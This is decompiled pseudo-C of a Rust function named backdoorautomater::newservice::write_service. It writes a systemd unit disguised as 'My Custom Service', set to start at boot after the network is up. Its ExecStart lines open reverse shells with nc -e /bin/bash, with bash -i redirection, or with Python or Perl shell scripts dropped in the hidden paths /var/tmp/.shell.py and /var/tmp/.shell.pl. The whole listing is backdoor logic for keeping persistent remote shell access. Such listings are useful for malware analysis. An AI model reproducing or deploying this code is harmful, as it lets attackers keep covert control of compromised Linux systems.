
  char const (**)[0x94] backdoorautomater::newservice::write_service::hf90b4724373f44a5(int64_t* arg1, int64_t* arg2, int64_t* arg3, char arg4)

{
    int64_t rax;
    rax = 1;
    int64_t var_50 = rax;
    int64_t r13;
    r13 = 1;
    int128_t var_48;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_48, 
        arg2);
    r13 = 1;
    
    if (!_$LT$$RF$str$u20$as$u20$core..str..pattern..Pattern$GT$::is_contained_in::h36f93e99507e9f19(arg1[1], arg1[2]))
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(arg1, 
            ".service[^0-9/]+Error!: /.bashrc…", 8);
    
    uint64_t rax_3 = arg4 - 1;
    
    if (rax_3 > 3)
        goto label_4580c7;
    
    int128_t var_b8;
    uint64_t var_a8;
    int128_t var_98;
    int128_t var_78;
    int64_t var_68;
    char rbp;
    char const (** result)[0x94];
    
    switch (rax_3)
    {
        case 0:
        {
            var_78 = "ExecStart=nc [Unit]\nDescription…";
            *var_78[8] = 0xd;
            var_68 = *(arg3 + 8);
            r13 = 1;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_b8, &var_78, 2, 1, 0);
            var_98 = var_b8;
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, 
                "  -e /bin/bash\n/ 0>&1'\nExecSta…", 1);
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, arg2[1], 
                arg2[2]);
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, 
                " -e /bin/bash\n/ 0>&1'\nExecStar…", 0xe);
            std::fs::File::create::he97042899d0016f9(&var_78, arg1);
            
            if (var_78)
            {
                result = *var_78[8];
                label_457f40:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
                label_45806d:
                r13 = 1;
                rbp = 0;
                label_458077:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_48);
                
                if (!rbp)
                {
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
                    int64_t* r15;
                    r15 = 1;
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
                }
                
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
                return result;
            }
            
            var_b8 = *var_78[4];
            char const (** result_21)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "[Unit]\nDescription=My Custom Se…", 7);
            result = result_21;
            
            if (result_21)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457f40;
            }
            
            char const (** result_22)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "Description=My Custom Service\nA…", 0x1e);
            result = result_22;
            
            if (result_22)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457f40;
            }
            
            char const (** result_23)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "After=network-online.target\n\n[…", 0x1d);
            result = result_23;
            
            if (result_23)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457f40;
            }
            
            char const (** result_24)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "[Service]\nExecStartPre=/bin/sle…", 0xa);
            result = result_24;
            
            if (result_24)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457f40;
            }
            
            char const (** result_25)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "ExecStartPre=/bin/sleep 15\nType…", 0x1b);
            result = result_25;
            
            if (result_25)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457f40;
            }
            
            char const (** result_26)[0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, *var_98[8], var_a8);
            result = result_26;
            
            if (result_26)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457f40;
            }
            
            char const (** result_27)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "Type=simple\n\n[Install]\nWanted…", 0xd);
            result = result_27;
            
            if (result_27)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457f40;
            }
            
            char const (** result_28)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "[Install]\nWantedBy=default.targ…", 0xa);
            result = result_28;
            
            if (result_28)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457f40;
            }
            
            char const (** result_29)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "WantedBy=default.target\nExecSta…", 0x18);
            result = result_29;
            
            if (result_29)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457f40;
            }
            
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
            label_4580c7:
            r13 = 1;
            rbp = 0;
            break;
        }
        case 1:
        {
            var_78 = "ExecStart=/bin/bash -c 'bash -i …";
            *var_78[8] = 0x2c;
            var_68 = *(arg3 + 8);
            r13 = 1;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_b8, &var_78, 2, 1, 0);
            var_98 = var_b8;
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, 
                "/ 0>&1'\nExecStart=nc [Unit]\nDe…", 1);
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, arg2[1], 
                arg2[2]);
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, 
                " 0>&1'\nExecStart=nc [Unit]\nDes…", 7);
            std::fs::File::create::he97042899d0016f9(&var_78, arg1);
            
            if (!var_78)
            {
                var_b8 = *var_78[4];
                char const (** result_30)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                    &var_b8, "[Unit]\nDescription=My Custom Se…", 7);
                result = result_30;
                
                if (!result_30)
                {
                    char const (** result_31)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                        &var_b8, "Description=My Custom Service\nA…", 0x1e);
                    result = result_31;
                    
                    if (!result_31)
                    {
                        char const (** result_32)[0x94] =
                            std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                            "After=network-online.target\n\n[…", 0x1d);
                        result = result_32;
                        
                        if (!result_32)
                        {
                            char const (** result_33)[0x94] =
                                std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                                "[Service]\nExecStartPre=/bin/sle…", 0xa);
                            result = result_33;
                            
                            if (!result_33)
                            {
                                char const (** result_34)[0x94] =
                                    std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                                    "ExecStartPre=/bin/sleep 15\nType…", 0x1b);
                                result = result_34;
                                
                                if (!result_34)
                                {
                                    char const (** result_35)[0x94] =
                                        std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                                        *var_98[8], var_a8);
                                    result = result_35;
                                    
                                    if (!result_35)
                                    {
                                        char const (** result_36)[0x94] =
                                            std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                                            "Type=simple\n\n[Install]\nWanted…", 0xd);
                                        result = result_36;
                                        
                                        if (!result_36)
                                        {
                                            char const (** result_37)[0x94] =
                                                std::io::Write::write_all::h18f2f3ca7c9bcc20(
                                                &var_b8, "[Install]\nWantedBy=default.targ…", 0xa);
                                            result = result_37;
                                            
                                            if (!result_37)
                                            {
                                                char const (** result_38)[0x94] =
                                                    std::io::Write::write_all::h18f2f3ca7c9bcc20(
                                                    &var_b8, "WantedBy=default.target\nExecSta…", 
                                                    0x18);
                                                result = result_38;
                                                
                                                if (!result_38)
                                                {
                                                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                                                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
                                                    goto label_4580c7;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
            }
            else
                result = *var_78[8];
            
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
            goto label_45806d;
        }
        case 2:
        {
            uint64_t rax_7 = arg2[2];
            var_b8 = *arg2;
            int64_t var_68_1 = arg3[2];
            var_78 = *arg3;
            backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
                backdoorautomater::newservice::write_shell_pyfile::h388a3bef0a7e09fc(&var_b8, 
                &var_78));
            var_78 = "ExecStart=python \nExecStart=per…";
            *var_78[8] = 0x11;
            char const* const var_68_2 = "/var/tmp/.shell.py/var/tmp/.shel…";
            int64_t var_60_1 = 0x12;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_b8, &var_78, 2, 1, 0);
            var_98 = var_b8;
            std::fs::File::create::he97042899d0016f9(&var_78, arg1);
            
            if (var_78)
            {
                result = *var_78[8];
                label_457cbf:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
                label_457e13:
                rbp = 1;
                goto label_458077;
            }
            
            var_b8 = *var_78[4];
            char const (** result_1)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "[Unit]\nDescription=My Custom Se…", 7);
            result = result_1;
            
            if (result_1)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457cbf;
            }
            
            char const (** result_2)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "Description=My Custom Service\nA…", 0x1e);
            result = result_2;
            
            if (result_2)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457cbf;
            }
            
            char const (** result_3)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "After=network-online.target\n\n[…", 0x1d);
            result = result_3;
            
            if (result_3)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457cbf;
            }
            
            char const (** result_4)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "[Service]\nExecStartPre=/bin/sle…", 0xa);
            result = result_4;
            
            if (result_4)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457cbf;
            }
            
            char const (** result_5)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "ExecStartPre=/bin/sleep 15\nType…", 0x1b);
            result = result_5;
            
            if (result_5)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457cbf;
            }
            
            char const (** result_6)[0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, *var_98[8], rax_7);
            result = result_6;
            
            if (result_6)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457cbf;
            }
            
            char const (** result_7)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "\nExecStart=perl  /etc/systemd/s…", 1);
            result = result_7;
            
            if (result_7)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457cbf;
            }
            
            char const (** result_8)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "Type=simple\n\n[Install]\nWanted…", 0xd);
            result = result_8;
            
            if (result_8)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457cbf;
            }
            
            char const (** result_9)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "[Install]\nWantedBy=default.targ…", 0xa);
            result = result_9;
            
            if (result_9)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457cbf;
            }
            
            char const (** result_10)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "WantedBy=default.target\nExecSta…", 0x18);
            result = result_10;
            
            if (result_10)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457cbf;
            }
            
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
            rbp = 1;
            break;
        }
        case 3:
        {
            uint64_t rax_11 = arg2[2];
            var_b8 = *arg2;
            int64_t var_68_3 = arg3[2];
            var_78 = *arg3;
            backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
                backdoorautomater::newservice::write_shell_perl::h8f1a23ba35eb1918(&var_b8, 
                &var_78));
            var_78 = "ExecStart=perl  /etc/systemd/sys…";
            *var_78[8] = 0xf;
            char const* const var_68_4 = "/var/tmp/.shell.pl  -e /bin/bash…";
            int64_t var_60_2 = 0x12;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_b8, &var_78, 2, 1, 0);
            var_98 = var_b8;
            std::fs::File::create::he97042899d0016f9(&var_78, arg1);
            
            if (var_78)
            {
                result = *var_78[8];
                label_457e0e:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
                goto label_457e13;
            }
            
            var_b8 = *var_78[4];
            char const (** result_11)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "[Unit]\nDescription=My Custom Se…", 7);
            result = result_11;
            
            if (result_11)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457e0e;
            }
            
            char const (** result_12)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "Description=My Custom Service\nA…", 0x1e);
            result = result_12;
            
            if (result_12)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457e0e;
            }
            
            char const (** result_13)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "After=network-online.target\n\n[…", 0x1d);
            result = result_13;
            
            if (result_13)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457e0e;
            }
            
            char const (** result_14)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "[Service]\nExecStartPre=/bin/sle…", 0xa);
            result = result_14;
            
            if (result_14)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457e0e;
            }
            
            char const (** result_15)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "ExecStartPre=/bin/sleep 15\nType…", 0x1b);
            result = result_15;
            
            if (result_15)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457e0e;
            }
            
            char const (** result_16)[0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, *var_98[8], rax_11);
            result = result_16;
            
            if (result_16)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457e0e;
            }
            
            char const (** result_17)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "\nExecStart=perl  /etc/systemd/s…", 1);
            result = result_17;
            
            if (result_17)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457e0e;
            }
            
            char const (** result_18)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "Type=simple\n\n[Install]\nWanted…", 0xd);
            result = result_18;
            
            if (result_18)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457e0e;
            }
            
            char const (** result_19)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "[Install]\nWantedBy=default.targ…", 0xa);
            result = result_19;
            
            if (result_19)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457e0e;
            }
            
            char const (** result_20)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                "WantedBy=default.target\nExecSta…", 0x18);
            result = result_20;
            
            if (result_20)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto label_457e0e;
            }
            
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
            rbp = 1;
            break;
        }
    }
    
    int64_t var_a8_3 = arg1[2];
    var_b8 = *arg1;
    int64_t var_38;
    int64_t var_68_5 = var_38;
    var_78 = var_48;
    backdoorautomater::newservice::create_service::h60e36f0974dfe8c1(&var_b8, &var_78);
    
    if (!rbp)
    {
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    }
    
    return nullptr;
}
